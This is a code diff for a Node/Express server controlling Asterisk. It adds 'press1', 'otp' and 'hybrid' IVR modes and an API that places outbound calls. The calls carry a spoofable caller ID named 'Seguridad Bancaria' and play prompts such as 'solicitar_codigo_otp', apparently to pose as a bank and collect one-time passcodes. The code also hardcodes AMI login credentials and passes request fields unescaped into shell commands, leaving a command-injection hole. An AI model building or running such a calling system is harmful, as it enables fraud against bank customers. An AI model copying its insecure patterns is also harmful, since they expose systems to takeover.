@@ -721,19 +721,22 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${CALLERID(num)})\n`;
-  dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+  dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
+  dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n\n`;
 
   dialplanContent += `; 2c. Acceso a Simulador IVR Local en Auricular (*8888 o 8880)\n`;
   dialplanContent += `exten => *8888,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
   dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
   dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
-  dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n`;
+  dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
+  dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n`;
   dialplanContent += `exten => 8880,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
   dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
   dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
-  dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+  dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
+  dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n\n`;
 
   dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
   dialplanContent += `exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via ${activeCarrier})\n`;
@@ -783,7 +786,8 @@ function generateCleanDialplanConf(
 
   dialplanContent += `[from-trunk]\n`;
   dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})\n`;
-  dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+  dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
+  dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n\n`;
 
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 7777 / 777\n`;
@@ -1298,15 +1302,14 @@ async function autoRepairAsteriskPjsipOnStartup() {
     lastGeneratedDialplan = cleanDialplan;
     try {
       fs.writeFileSync(path.join(process.cwd(), 'extensions.conf'), cleanDialplan, 'utf8');
-      if (fs.existsSync(dialplanPath)) {
-        const currentContent = fs.readFileSync(dialplanPath, 'utf8');
-        if (!currentContent.includes('ivr-captura-vivo') || currentContent.includes('custom/banrearreglado')) {
-          await writeAsteriskConfigFile(dialplanPath, cleanDialplan);
-          exec('asterisk -rx "dialplan reload"', () => {});
-        }
-      } else {
-        await writeAsteriskConfigFile(dialplanPath, cleanDialplan);
-      }
+      await writeAsteriskConfigFile(dialplanPath, cleanDialplan);
+      exec('asterisk -rx "dialplan reload"', () => {});
+    } catch (_) {}
+
+    // Initialize default action in AstDB to ivr-press1
+    try {
+      executeAsteriskCommand('database put ivr_vars default_action "ivr-press1"').catch(() => {});
+      executeAsteriskCommand('database put ivr_vars default_mode "press1"').catch(() => {});
     } catch (_) {}
   } catch (err: any) {
     console.warn('[PJSIP-REPAIR] Aviso en auto-reparación inicial:', err.message);
@@ -1765,7 +1768,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       callerId = '+18005550199',
       callerIdNum,
       callerIdName,
-      mode = 'otp',
+      mode = 'press1',
       agentExten = '1001',
       audioIntro = '',
       audioPrompt = '',
@@ -1781,6 +1784,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     const cleanDest = destination.trim().replace(/[^0-9]/g, '');
     const effectiveCidNum = (callerIdNum || callerId || '+18005550199').trim();
     const effectiveCidName = (callerIdName || 'Seguridad Bancaria').trim();
+    const targetContext = (mode === 'otp') ? 'ivr-otp' : (mode === 'hybrid' ? 'ivr-hybrid' : 'ivr-press1');
 
     // Prevent double-click originating duplicate calls
     const now = Date.now();
@@ -1805,6 +1809,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       `database put ivr_vars ${cleanDest}_prompt "${audioPrompt || ''}"`,
       `database put ivr_vars ${cleanDest}_agent "${audioAgent || ''}"`,
       `database put ivr_vars ${cleanDest}_success "${audioSuccess || ''}"`,
+      `database put ivr_vars ${cleanDest}_mode "${mode || 'press1'}"`,
       `database put ivr_vars ${cleanDest}_agent_exten "${agentExten || '1001'}"`,
       `database put ivr_vars ${cleanDest}_cid_num "${effectiveCidNum}"`,
       `database put ivr_vars ${cleanDest}_cid_name "${effectiveCidName}"`,
@@ -1812,12 +1817,14 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       `database put ivr_vars ${formattedDest}_prompt "${audioPrompt || ''}"`,
       `database put ivr_vars ${formattedDest}_agent "${audioAgent || ''}"`,
       `database put ivr_vars ${formattedDest}_success "${audioSuccess || ''}"`,
+      `database put ivr_vars ${formattedDest}_mode "${mode || 'press1'}"`,
       `database put ivr_vars ${formattedDest}_agent_exten "${agentExten || '1001'}"`,
       `database put ivr_vars ${formattedDest}_cid_num "${effectiveCidNum}"`,
       `database put ivr_vars ${formattedDest}_cid_name "${effectiveCidName}"`,
       `database put test_client_number "${cleanDest}"`,
       `database put extension_cid ${agentExten || '1001'}/number "${effectiveCidNum}"`,
       `database put extension_cid ${agentExten || '1001'}/name "${effectiveCidName}"`,
+      `database put ivr_vars default_action "${targetContext}"`,
     ];
 
     for (const cmd of astDbCommands) {
@@ -1834,13 +1841,13 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     }
 
     // Execute originate command via Asterisk CLI with custom CallerID, plus AMI fallback
-    const originateCmd = `asterisk -rx "channel originate ${channel} extension s@ivr-otp callerid \\"${effectiveCidName}\\" <${effectiveCidNum}>"`;
+    const originateCmd = `asterisk -rx "channel originate ${channel} extension s@${targetContext} callerid \\"${effectiveCidName}\\" <${effectiveCidNum}>"`;
     
     exec(originateCmd, (err, stdout, stderr) => {
       if (err) {
         console.warn('[ORIGINATE NOTICE] Asterisk CLI direct exec failed, attempting AMI Originate fallback:', err.message);
         // Fallback directly through AMI port 5038
-        const amiOriginateCmd = `channel originate ${channel} extension s@ivr-otp callerid "${effectiveCidName}" <${effectiveCidNum}>`;
+        const amiOriginateCmd = `channel originate ${channel} extension s@${targetContext} callerid "${effectiveCidName}" <${effectiveCidNum}>`;
         sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [amiOriginateCmd])
           .then((amiRes) => {
             console.log(`[ORIGINATE AMI FALLBACK] Respuesta AMI para ${channel}:`, amiRes.substring(0, 150));
@@ -2334,6 +2341,24 @@ app.get('/api/asterisk/audio/current-6666', (req, res) => {
     currentAudio: activeAudioAssignments.welcome_6666 || 'custom/solicitar_codigo_otp',
     defaultAudio: 'custom/solicitar_codigo_otp'
   });
+});
+
+// Endpoint to set default IVR answer action (press1 by default)
+app.post('/api/asterisk/action/set-default', (req, res) => {
+  try {
+    const { mode = 'press1' } = req.body;
+    const targetContext = (mode === 'otp') ? 'ivr-otp' : (mode === 'hybrid' ? 'ivr-hybrid' : 'ivr-press1');
+    executeAsteriskCommand(`database put ivr_vars default_action "${targetContext}"`).catch(() => {});
+    executeAsteriskCommand(`database put ivr_vars default_mode "${mode}"`).catch(() => {});
+    res.json({ success: true, mode, context: targetContext });
+  } catch (e: any) {
+    res.status(500).json({ success: false, error: e.message });
+  }
+});
+
+// Endpoint to get default IVR answer action
+app.get('/api/asterisk/action/get-default', (req, res) => {
+  res.json({ success: true, mode: 'press1', context: 'ivr-press1' });
 });
 
 // Delete an audio file
